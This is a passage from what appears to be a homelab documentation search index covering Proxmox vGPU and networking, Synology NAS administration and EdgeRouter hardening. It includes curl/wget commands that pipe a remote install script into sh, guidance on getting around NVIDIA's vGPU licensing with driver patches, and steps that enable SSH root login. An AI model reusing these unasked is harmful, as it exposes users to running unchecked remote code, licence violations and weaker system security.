GPU). To fix that, either add <code>vgpu_type = \"NVS\"</code> to your profile overrides (see below), or switch to an equivalent A or B profile (for example <code>GRID RTX6000-4B</code>)</p> <p>C profiles dont exist anymore, just use Q profiles. C profiles (for example <code>GRID RTX6000-4C</code>) only work on Linux, don't try using those on Windows, it will not work - at all.</p> <p>A profiles (for example <code>GRID RTX6000-4A</code>) will NOT work on Linux, they only work on Windows.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#common-vram-sizes", "title": "Common VRAM sizes", "text": "<p>Here are some common framebuffer sizes that you might want to use:</p> <ul> <li>512MB:   <pre><code>framebuffer = 0x1A000000\nframebuffer_reservation = 0x6000000\n</code></pre></li> <li>1GB:   <pre><code>framebuffer = 0x38000000\nframebuffer_reservation = 0x8000000\n</code></pre></li> <li>2GB:   <pre><code>framebuffer = 0x74000000\nframebuffer_reservation = 0xC000000\n</code></pre></li> <li>3GB:   <pre><code>framebuffer = 0xB0000000\nframebuffer_reservation = 0x10000000\n</code></pre></li> <li>4GB:   <pre><code>framebuffer = 0xEC000000\nframebuffer_reservation = 0x14000000\n</code></pre></li> <li>5GB:   <pre><code>framebuffer = 0x128000000\nframebuffer_reservation = 0x18000000\n</code></pre></li> <li>6GB:   <pre><code>framebuffer = 0x164000000\nframebuffer_reservation = 0x1C000000\n</code></pre></li> <li>8GB:   <pre><code>framebuffer = 0x1DC000000\nframebuffer_reservation = 0x24000000\n</code></pre></li> <li>10GB:   <pre><code>framebuffer = 0x254000000\nframebuffer_reservation = 0x2C000000\n</code></pre></li> <li>12GB:   <pre><code>framebuffer = 0x2CC000000\nframebuffer_reservation = 0x34000000\n</code></pre></li> <li>16GB:   <pre><code>framebuffer = 0x3BC000000\nframebuffer_reservation = 0x44000000\n</code></pre></li> <li>20GB:   <pre><code>framebuffer = 0x4AC000000\nframebuffer_reservation = 0x54000000\n</code></pre></li> <li>24GB:   <pre><code>framebuffer = 0x59C000000\nframebuffer_reservation = 0x64000000\n</code></pre></li> <li>32GB:   <pre><code>framebuffer = 0x77C000000\nframebuffer_reservation = 0x84000000\n</code></pre></li> <li>48GB:   <pre><code>framebuffer = 0xB2D200000\nframebuffer_reservation = 0xD2E00000\n</code></pre></li> </ul> <p><code>framebuffer</code> and <code>framebuffer_reservation</code> will always equal the VRAM size in bytes when added together.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#adding-a-vgpu-to-a-proxmox-vm", "title": "Adding a vGPU to a Proxmox VM", "text": "<p>Go to the proxmox webinterface, go to your VM, then to <code>Hardware</code>, then to <code>Add</code> and select <code>PCI Device</code>. You should be able to choose from a list of pci devices. Choose your GPU there, its entry should say <code>Yes</code> in the <code>Mediated Devices</code> column.</p> <p>Now you should be able to also select the <code>MDev Type</code>. Choose whatever profile you want, if you don't remember which one you want, you can see the list of all available types with <code>mdevctl types</code>.</p> <p>Finish by clicking <code>Add</code>, start the VM and install the required drivers. After installing the drivers you can shut the VM down and remove the virtual display adapter by selecting <code>Display</code> in the <code>Hardware</code> section and selecting <code>none (none)</code>. ONLY do that if you have some other way to access the Virtual Machine like Parsec or Remote Desktop because the Proxmox Console won't work anymore.</p> <p>Enjoy your new vGPU VM :)</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#licensing", "title": "Licensing", "text": "<p>Usually a license is required to use vGPU, but luckily the community found several ways around that. Spoofing the vGPU instance to a Quadro GPU used to be very popular, but I don't recommend it anymore. I've also removed the related sections from this guide. If you still want it for whatever reason, you can go back in the commit history to find the instructions on how to use that.</p> <p>The recommended way to get around the license is to set up your own license server. Follow the instructions here (or here if the other link is down).</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#psa-for-pascal-and-older-gpus-like-the-p4-gtx-1080", "title": "PSA for Pascal (and older) GPUs like the P4, GTX 1080...", "text": "<p>Starting from driver version 17.0, nvidia in their infinite wisdom dropped support for older cards, so now no matter if the card used to be supported (Tesla P4 etc) or not, you have to patch the driver.</p> <p>In addition to that you have to copy the vgpuConfig.xml from 16.x and replace the new 17.x xml. To do that, you install and patch the 17.x driver as described above, and then extract the 16.x driver with <code>./driver.run -x</code>, and copy the <code>vgpuConfig.xml</code> from inside the extracted archive to <code>/usr/share/nvidia/vgpu/vgpuConfig.xml</code> (replace the existing file). Then reboot and you should see vgpu profiles in mdevctl again.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#common-problems", "title": "Common problems", "text": "<p>Most problems can be solved by reading the instructions very carefully. For some very common problems, read here:</p> <ul> <li>The nvidia driver won't install/load</li> <li>If you were using gpu passthrough before, revert ALL of the steps you did or start with a fresh proxmox installation. If you run <code>lspci -knnd 10de:</code> and see <code>vfio-pci</code> under <code>Kernel driver in use:</code> then you have to fix that</li> <li>Make sure that you are using a supported kernel version (check <code>uname -a</code>)</li> <li>My OpenGL performance is absolute garbage, what can I do?</li> <li>Read here</li> <li><code>mdevctl types</code> doesn't output anything, how to fix it?</li> <li>Make sure that you don't have unlock disabled if you have a consumer gpu (more information)</li> <li>vGPU doesn't work on my RTX 3080! What to do?</li> <li>Learn to read</li> <li>Make sure that you don't have any dummy plugs connected to the GPU ports, they may cause problems as reported by a user from the vgpu discord</li> </ul>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#support", "title": "Support", "text": "<p>If something isn't working, please create an issue or join the Discord server and ask for help in the <code>#proxmox-support</code> channel so that the community can help you.</p> <p>When asking for help, please describe your problem in detail instead of just saying \"vgpu doesn't work\". Usually a rough overview over your system (gpu, mainboard, proxmox version, kernel version, ...) and full output of <code>dmesg</code> and/or <code>journalctl --no-pager -b 0 -u nvidia-vgpu-mgr.service</code> (\u2190 this only after starting the VM that causes trouble) is helpful. Please also provide the output of <code>uname -a</code> and <code>cat /proc/cmdline</code></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#do-not-send-me-a-dm-im-not-your-personal-support", "title": "DO NOT SEND ME A DM, I'M NOT YOUR PERSONAL SUPPORT", "text": "", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#feed-my-coffee-addiction", "title": "Feed my coffee addiction \u2615", "text": "<p>If you found this guide helpful and want to support me, please feel free to buy me a coffee. Thank you very much!</p> <p>Alternatively, you can donate anonymously via Monero XMR to my wallet:</p> <p> <pre><code>87GCYs8gAPUCt5PQYjk7FjGiLB44KYvM2aaFHB9U7syBPjnhRq4WVnF8F5xtvKzSp6Fp1HFrH94cC4FXP59G44pv6NueKwL\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#further-reading", "title": "Further reading", "text": "<p>Thanks to all these people (in no particular order) for making this project possible - DualCoder for his original vgpu_unlock repo with the kernel hooks - mbilker for the rust version, vgpu_unlock-rs - KrutavShah for the wiki - HiFiPhile for the C version of vgpu unlock - rupansh for the original twelve.patch to patch the driver on kernels &gt;= 5.12 - mbuchel#1878 on the GPU Unlocking discord for fourteen.patch to patch the driver on kernels &gt;= 5.14 - erin-allison for the nvidia-smi wrapper script - LIL'pingu#9069 on the GPU Unlocking discord for his patch to nop out code that NVIDIA added to prevent usage of drivers with a version 460 - 470 with consumer cards - GreenDam for the Linux Kernel 6.8 support for 16.5 and 17.1 drivers (see merge request)</p> <p>If I forgot to mention someone, please create an issue or let me know otherwise.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#contributing", "title": "Contributing", "text": "<p>Pull requests are welcome (factual errors, amendments, grammar/spelling mistakes etc).</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#license", "title": "License", "text": "<p>This project is licensed under AGPL-3.0-or-later</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/network/disable-ipv6/", "title": "Disable IPv6 on Proxmox Permanently", "text": "<p>By default, Proxmox IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol.</p> <p>Output of <code>ip addr</code> command:</p> <p></p> <p>You can disable IPv6 on Proxmox VE by editing the <code>/etc/default/grub</code> file.</p> <pre><code>nano /etc/default/grub\n</code></pre> <p>add <code>ipv6.disable=1</code> to the end of <code>GRUB_CMDLINE_LINUX_DEFAULT</code> and <code>GRUB_CMDLINE_LINUX</code> line. Don't change the other values at those lines.</p> <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"ipv6.disable=1\"\nGRUB_CMDLINE_LINUX=\"ipv6.disable=1\"\n</code></pre> <p>The config should look like this:</p> <p></p> <p>Update the grub configuration.</p> <pre><code>update-grub\n</code></pre> <p>Save and exit. Reboot Proxmox Server to apply the changes.</p> <p>Output of <code>ip addr</code> command after disabling IPv6 on Proxmox VE:</p> <p></p>", "tags": ["proxmox", "ipv6"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/", "title": "Proxmox Networking", "text": "<p>Official Proxmox networking documentation can be found here.</p>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#basics", "title": "Basics", "text": "Proxmox network configuration file location<pre><code>/etc/network/interfaces\n</code></pre> Restart proxmox network service to apply changes<pre><code>systemctl restart networking.service\n</code></pre>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#example-of-multi-network-interface-server", "title": "Example of Multi Network Interface Server", "text": "<p>The next examples will be based on the following network nics, <code>ip addr</code> output:</p> <pre><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n2: enp7s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 18:c0:4d:00:9f:b7 brd ff:ff:ff:ff:ff:ff\n3: enp6s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 18:c0:4d:00:9f:b9 brd ff:ff:ff:ff:ff:ff\n4: enp12s0f4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq master vmbr0 state UP group default qlen 1000\n    link/ether 00:07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff\n5: enp12s0f4d1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 00:07:43:29:42:c8 brd ff:ff:ff:ff:ff:ff\n6: enp12s0f4d2: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 00:07:43:29:42:d0 brd ff:ff:ff:ff:ff:ff\n7: enp12s0f4d3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 00:07:43:29:42:d8 brd ff:ff:ff:ff:ff:ff\n8: wlp5s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000\n    link/ether 8c:c6:81:f0:a6:9a brd ff:ff:ff:ff:ff:ff\n9: vmbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether 00:07:43:29:42:c0 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.100.12/24 scope global vmbr0\n       valid_lft forever preferred_lft forever\n</code></pre> <p>In order Identify physical network interfaces corresponding to Network Interfaces name in Proxmox you can follow this guide</p> <p>Breakdown of the <code>ip addr</code> output:</p> <ol> <li><code>lo</code> is a loopback interface.</li> <li><code>enp7s0</code> is a 2.5G network interface.</li> <li><code>enp6s0</code> is a 1G network interface.</li> <li><code>enp12s0f4</code> is a 10G network interface.</li> <li><code>enp12s0f4d1</code> is a 10G network interface.</li> <li><code>enp12s0f4d2</code> is a 10G network interface.</li> <li><code>enp12s0f4d3</code> is a 10G network interface.</li> <li><code>wlp5s0</code> is a Wifi network interface</li> <li><code>vmbr0</code> is a bridge interface.</li> </ol> <p>The content of the <code>/etc/network/interfaces</code> after fresh installation:</p> <pre><code>auto lo\niface lo inet loopback\n\niface enp12s0f4 inet manual\n\nauto vmbr0\niface vmbr0 inet static\n    address 192.168.100.12/24\n    gateway 192.168.100.1\n    bridge-ports enp12s0f4\n    bridge-stp off\n    bridge-fd 0\n\niface enp7s0 inet manual\n\niface enp6s0 inet manual\n\niface enp12s0f4d1 inet manual\n\niface enp12s0f4d2 inet manual\n\niface enp12s0f4d3 inet manual\n\niface wlp5s0 inet manual\n</code></pre> <p>Info</p> <p><code>vmbr0</code> is a bridge interface. It's used to provision network to virtual machines and containers on Proxmox VE Server. We can assign multiple network interfaces to the bridge interface with <code>bridge-ports</code> option.</p>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#static-ip-bridge-configuration", "title": "Static IP Bridge Configuration", "text": "<p>The following example shows a static IP configuration <code>vmbr0</code> bridge interface, including two network interfaces <code>enp12s0f4</code> and <code>enp7s0</code>.</p> <pre><code>auto vmbr0\niface vmbr0 inet static\n           address 192.168.100.12/24\n           gateway 192.168.100.1\n           bridge-ports enp12s0f4 enp7s0\n           bridge-stp off\n           bridge-fd 0\n</code></pre> <p>Configuring multi network interfaces to the bridge interface will provide you a failover behavior when the network interface is down or disconnected - for example, when specific switch is down.</p>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#static-ip-bridge-with-vlan-aware-configuration", "title": "Static IP Bridge with VLAN Aware Configuration", "text": "<p>The following example shows a static IP as above but with VLAN Aware bridge.</p> <pre><code>auto vmbr0\niface vmbr0 inet static\n           address 192.168.100.12/24\n           gateway 192.168.100.1\n           bridge-ports enp12s0f4 enp7s0\n           bridge-stp off\n           bridge-fd 0\n           bridge-vlan-aware yes\n           bridge-vids 2-4094\n</code></pre>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#dhcp-bridge-configuration", "title": "DHCP Bridge Configuration", "text": "<p>The following example shows a DHCP configuration <code>vmbr0</code> bridge interface, including two network interfaces <code>enp12s0f4</code> and <code>enp7s0</code>.</p> <pre><code>auto vmbr0\niface vmbr0 inet dhcp\n           bridge-ports enp12s0f4 enp7s0\n           bridge-stp off\n           bridge-fd 0\n</code></pre>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#dhcp-bridge-with-vlan-aware-configuration", "title": "DHCP Bridge with VLAN Aware Configuration", "text": "<p>The following example shows a DHCP as above but with VLAN Aware bridge.</p> <pre><code>auto vmbr0\niface vmbr0 inet dhcp\n           bridge-ports enp12s0f4 enp7s0\n           bridge-stp off\n           bridge-fd 0\n           bridge-vlan-aware yes\n           bridge-vids 2-4094\n</code></pre>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/proxmox/network/proxmox-networking/#personal-network-configuration", "title": "Personal Network Configuration", "text": "<p>Here's a sample of the <code>/etc/network/interfaces</code> file for a personal network:</p> <pre><code>auto lo\niface lo inet loopback\n\nauto vmbr0\niface vmbr0 inet dhcp\n           bridge-ports enp12s0f4 enp12s0f4d1 enp12s0f4d2 enp12s0f4d3 enp7s0\n           bridge-stp off\n           bridge-fd 0\n           bridge-vlan-aware yes\n           bridge-vids 2-4094\n\niface enp12s0f4 inet manual\n\niface enp12s0f4d1 inet manual\n\niface enp12s0f4d2 inet manual\n\niface enp12s0f4d3 inet manual\n\niface enp7s0 inet manual\n\niface enp6s0 inet manual\n\niface wlp5s0 inet manual\n</code></pre>", "tags": ["proxmox", "network"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/", "title": "How to install oh-my-zsh on Synology NAS", "text": "", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#introduction", "title": "Introduction", "text": "<p>The following steps will instruct you how to install oh-my-zsh on Synology DSM NAS.</p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#whats-zsh", "title": "Whats' ZSH", "text": "<p>Z-shell (Zsh) is a Unix shell that can be used as an interactive login shell and as a shell scripting command interpreter. Zsh is an enhanced Bourne shell with many enhancements, including some Bash, ksh and tcsh features.</p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#whats-oh-my-zsh", "title": "What's Oh-My-Zsh", "text": "<p>Oh My Zsh is an open source, community-driven framework for managing your zsh configuration.</p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#community-packages-for-synology-dsm", "title": "Community Packages for Synology DSM", "text": "<p>In order to install oh-my-zsh, we need to add 3<sup>rd</sup> party packages to Synology DSM. Synology Community Packages provides packages for Synology-branded NAS devices.</p> <p>DSM 6 and below:</p> <p>Log into your NAS as administrator and go to Main Menu \u2192 Package Center \u2192 Settings and set Trust Level to Synology Inc. and trusted publishers.</p> <p>In the Package Sources tab, click Add, type SynoCommunity as Name and <code>https://packages.synocommunity.com/</code> as Location and then press OK to validate.</p> <p></p> <p>Go back to the Package Center and enjoy SynoCommunity's packages in the Community tab.</p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-z-shell-with-modules", "title": "Install <code>Z shell (with modules)</code>", "text": "<p>Install <code>Z shell (with modules)</code> from package center Community tab.</p> <p></p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-git", "title": "Install <code>Git</code>", "text": "<p>Install <code>Git</code> from package center Community tab.</p> <p></p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#change-the-default-shell-to-zsh", "title": "Change The Default Shell to <code>ZSH</code>", "text": "<p>The following steps will be performed via SSH</p> <p>edit <code>~/.profile</code> the file may be missing, so create it if it doesn't exist.</p> <pre><code>vi ~/.profile\n</code></pre> <p>Append the codes below to the end of the file or add if empty.</p> <pre><code>if [[ -x /usr/local/bin/zsh ]]; then\n  export SHELL=/usr/local/bin/zsh\n  exec /usr/local/bin/zsh\nfi\n</code></pre> <p>Open new SSH session to Synology NAS the shell should be <code>zsh</code></p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Install-oh-my-zsh/#install-oh-my-zsh", "title": "Install Oh My Zsh", "text": "<p>From new SSH session with <code>zsh</code> shell, install Oh My Zsh with the one of following command:</p> <p>with curl:</p> <pre><code>sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>with wget:</p> <pre><code>sh -c \"$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>At this point you should have a working <code>oh-my-zsh</code> working on your Synology NAS.</p>", "tags": ["synology", "oh-my-zsh"]}, {"location": "infrastructure/synology/Installing-vm-tools-on-virtual-machine/", "title": "Install VM Tools on Virtual Machine", "text": "<p>On Debian:</p> <pre><code>sudo add-apt-repository universe\nsudo apt-get install qemu-guest-agent\n</code></pre> <p>On CentOS 7:</p> <pre><code>yum install -y qemu-guest-agent\n</code></pre> <p>On CentOS 8:</p> <pre><code>dnf install -y qemu-guest-agent\n</code></pre>", "tags": ["synology"]}, {"location": "infrastructure/synology/auto-dsm-config-backup/", "title": "Auto DSM Config Backup", "text": "<p>Since synology's dms doesn't provide any auto-backup for it's configuration i've made a smile script that can be run at from the \"Task Scheduler\". The script invokes synoconfbkp cli command that will dump the config file to provided folder. I use dropbox's folder in my case (This will sync my files to DropBox account). It append a date and hostname. It also checks the same folder for files older of 60 days and deletes them so your storage won't be flooded with files from older than 2 month. I've scheduled the script to run ounces a day with the \"Task Scheduler\"</p> <p>To use it create new Task Scheduler choose a scheduler append the script to \"Run Command\" at \"Task Settings\" don't forget to change to destinations.</p> <pre><code>synoconfbkp export --filepath=/volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup/$(hostname)_$(date +%y%m%d).dss &amp;&amp; find /volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup -type f -mtime +60 -exec rm -f {} \\;\n</code></pre>", "tags": ["synology"]}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/", "title": "Free 80,443 Ports On Synology NAS (DSM)", "text": "<p>Synology NAS (DSM) is a network storage device, with some additional features like native support for virtualization, and docker support. One of the issues is that the default ports 80 and 443 are used by the web server even if you change the default ports of the Synology's DSM to other ports. In some cases, you want to use these ports for other purposes, such as a reverse proxy as an entry point for the web services. The following steps will help you to free the default ports 80 and 443 on the Synology NAS (DSM) for other purposes.</p>", "tags": ["synology", "NAS", "ports"]}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/#configure-the-synology-nas-dsm-to-listen-on-other-ports", "title": "Configure the Synology NAS (DSM) to Listen on Other Ports", "text": "<p>First, you need to configure the Synology NAS (DSM) to listen on other ports then 80, 443.</p> <p>Login to the Synology NAS (DSM) as administrator user open <code>Control Panel</code> and find <code>Login Portal</code> under <code>System</code></p> <p>Under <code>DSM</code> tab, change the DSM port (http) to a different port then 80, and the DSM port (https) to a different port then 443.</p> <p></p> <p>Click <code>Save</code> to save the changes. Then, re-login to the Synology NAS (DSM) with the new port as administrator user as we did above.</p>", "tags": ["synology", "NAS", "ports"]}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/#disable-the-synology-nas-dsm-to-listen-on-80-443-ports", "title": "Disable the Synology NAS (DSM) to Listen on 80, 443 Ports", "text": "<p>Synology NAS (DSM) will listen on 80, 443 ports after each reboot. Therefore, the changes will be lost after each reboot. The workaround is to run the a script to free the ports 80, 443 on each time the Synology NAS (DSM) is boots.</p> <p>The following one liner will free the ports 80, 443 on Nginx web server of the Synology NAS (DSM), until the Synology NAS (DSM) is rebooted. It removes the port 80, 443 from the <code>Nginx</code> config and restarts the <code>Nginx</code> service.</p> DSM 7.x.xDSM 6.x.x <pre><code>sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache\n\nsynosystemctl restart nginx\n</code></pre> <pre><code>sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache\n\nsynoservicecfg --restart nginx\n</code></pre> <p>In order to persist the changes, we will create a <code>Scheduled Task</code> to run the above script on each reboot.</p> <p>Head to <code>Control Panel</code> and find <code>Task Scheduler</code>, then click <code>Create</code> and select <code>Triggerd Task</code> - <code>User-defined script</code>.</p> <p>At <code>Create Task</code> - <code>General</code> page, fill in the following information:</p> <p>Task: Disable_DSM_Listening_on_80_443 User: root Event: Boot-up Pre-taks: None  Enabled: Yes <p></p> <p>At <code>Task Settings</code> tab, under <code>Run command</code> fill the <code>User-defined script</code> with the following depending on Synology NAS (DSM) version:</p> DSM 7.x.xDSM 6.x.x <pre><code>sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache\n\nsynosystemctl restart nginx\n</code></pre> <pre><code>sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache\n\nsynoservicecfg --restart nginx\n</code></pre> <p>Suggestion: Select the Notification when the task is terminated abnormally.</p> <p></p> <p>Click <code>OK</code>. The new task should be created. You can check the task by clicking <code>Run</code> in the <code>Task Scheduler</code> page. Preferred to reboot the Synology NAS (DSM) to make sure the changes are applied at boot.</p>", "tags": ["synology", "NAS", "ports"]}, {"location": "infrastructure/synology/enable-ssh-root-login/", "title": "Enable Synology SSH Root Login", "text": "<p>Synology DSM allows Linux experts to use the SSH terminal. By default you need to log in as a user and then enter \"sudo su root\" can be inconvenient, but there is the option of logging in as root directly.</p>", "tags": ["synology", "ssh"]}, {"location": "infrastructure/synology/enable-ssh-root-login/#section", "title": "Section", "text": "<p>First, the DSM Control Panel is called up, Extended mode must be activated so that the required icon Terminal &amp; SNMP appears. Under Terminal &amp; SNMP the SSH-Service just can enable.</p> <p>Connect to Synology dns with your admin user and password. Change user to root with the command \"sudo su\" and enter the Admins's password. Set the <code>root</code> user password with the command below:</p> <pre><code>sudo synouser -setpw root 'new_root_password'\n</code></pre> <p>Edit the file <code>/etc/ssh/sshd_config</code> and change the line <code>PermitRootLogin no</code> to <code>PermitRootLogin yes</code>.</p> <pre><code>sudo vi /etc/ssh/sshd_config\n</code></pre> <p>Reboot the Synology NAS to apply the changes.</p>", "tags": ["synology", "ssh"]}, {"location": "infrastructure/synology/ssh-with-rsa-key/", "title": "Synology DSM - Allow Presistent SSH With RSA Keys", "text": "<p>As a power user, i would like to be able to connect to my Synology DSM vis SSH. The issue is that Synology DSM won't allow you to use SSH with RSA keys out of the box and only allows you to use SSH with password. In order to allow the use of SSH keys we need to perform the following steps:</p>", "tags": ["synology", "dsm", "ssh", "rsa-keys"]}, {"location": "infrastructure/synology/ssh-with-rsa-key/#requirements", "title": "Requirements", "text": "<p>I will assume you have already have SSH keys generated, SSH server configured on Synology DSM</p> <ul> <li>Generated SSH keys</li> <li>SSH server configured on Synology DSM</li> </ul>", "tags": ["synology", "dsm", "ssh", "rsa-keys"]}, {"location": "infrastructure/synology/ssh-with-rsa-key/#allow-user-home-at-dsm-level", "title": "Allow <code>User Home</code> at DSM Level", "text": "<p><code>User Home</code> enable to create a personal home folder for each user, except for guest. This will allow as to create user's <code>.ssh</code> folder and <code>authorized_keys</code> file.</p> <ul> <li>Log into Synology web UI as an administrator user</li> <li>Control Panel -&gt; User &amp; Groups -&gt; Advanced, scroll down to \u201cUser Home\u201d</li> <li>Check \u201cEnable user home service\u201d, select an appropriate Location (i.e. volume1)</li> <li>Click \u201cApply\u201d</li> </ul> <p></p>", "tags": ["synology", "dsm", "ssh", "rsa-keys"]}, {"location": "infrastructure/synology/ssh-with-rsa-key/#configure-ssh-folder-and-authorized_keys-file", "title": "Configure <code>.ssh</code> Folder and <code>authorized_keys</code> File", "text": "<p>Log in to the NAS through SSH with the user you want to add key authorization for. The following example shows how to add will work for the active user in the SSH session.</p> <p>First change the permissins of the <code>users home</code> folder to 700</p> <pre><code>sudo chmod 700 ~\n</code></pre> <p>Create the <code>.ssh</code> folder and set permissions to 700</p> <pre><code>mkdir ~/.ssh &amp;&amp; chmod 700 ~/.ssh\n</code></pre> <p>Create the <code>authorized_keys</code> file and set permissions to 644</p> <pre><code>touch ~/.ssh/authorized_keys &amp;&amp; chmod 644 ~/.ssh/authorized_keys\n</code></pre> <p>Synology's DSM SSH server supports RSA and ed25519 keys.</p> <p>No you need to copy you public keys to <code>authorized_keys</code> file, you can do it manually or use the following command:</p> <pre><code>echo &lt;public-key-sting&gt; &gt;&gt; ~/.ssh/authorized_keys\n</code></pre> <p>You can do it automatically by using the following command from a client with the ssh key you want to add:</p> <pre><code>ssh-copy-id -i ~/.ssh/id_rsa &lt;user@ip-address&gt;\n</code></pre> <p>At this point you should be able to connect to Synology DSM via SSH using the key you just added.</p>", "tags": ["synology", "dsm", "ssh", "rsa-keys"]}, {"location": "infrastructure/ubiquiti/edge-router/", "title": "EdgeRouter", "text": "", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#clear-dns-forwarding-cache-via-ssh-call", "title": "Clear DNS Forwarding Cache via SSH Call", "text": "<pre><code>ssh user@192.168.1.1 'sudo /opt/vyatta/bin/sudo-users/vyatta-op-dns-forwarding.pl --clear-cache'\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#ssh-via-rsa-keys", "title": "SSH via RSA keys", "text": "<p>SSH to the Edge Router: Copy the public key to /tmp folder</p> <p>Run:</p> <pre><code>configure\nloadkey [your user] /tmp/id_rsa.pub\n</code></pre> <p>Check that the keys are working by opening new session</p> <p>Disable Password Authentication</p> <pre><code>set service ssh disable-password-authentication\ncommit ; save\n</code></pre> <p>Done.</p> <p>Enable Password Authentication if needed.</p> <pre><code>delete service ssh disable-password-authentication\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#hardening-edgerouter", "title": "Hardening EdgeRouter", "text": "<p>This will change the GUI to port 8443, disable old cyphers, Only will listen on internal Network. assuming your EdgeRouter IP is 192.168.1.1, if not change it accordingly.</p> <p>SSH to the Edge Router</p> <pre><code>configure\nset service gui listen-address 192.168.100.1\nset service gui https-port 8443\nset service gui older-ciphers disable\nset service ssh listen-address 192.168.100.1\nset service ssh protocol-version v2\nset service ubnt-discover disable\ncommit ; save\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#hardware-offloading", "title": "Hardware Offloading", "text": "<p>For Devices: ER-X / ER-X-SFP / EP-R6 Enable hwnat and ipsec offloading.</p> <pre><code>configure\n\nset system offload hwnat enable\nset 